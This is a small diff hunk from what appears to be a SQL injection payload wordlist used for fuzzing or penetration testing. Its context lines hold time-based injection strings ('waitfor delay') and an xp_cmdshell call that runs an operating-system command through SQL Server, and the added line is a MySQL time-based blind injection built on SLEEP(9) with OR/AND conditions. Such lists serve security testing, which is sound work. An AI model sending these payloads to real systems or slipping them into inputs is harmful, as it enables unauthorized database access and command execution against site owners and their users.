@@ -323,3 +323,4 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ');waitfor delay '0:0:5'--
 ");waitfor delay '0:0:5'--
 ));waitfor delay '0:0:5'--
+-1+OR+3 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW2 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW1=6 +AND+000762=000762
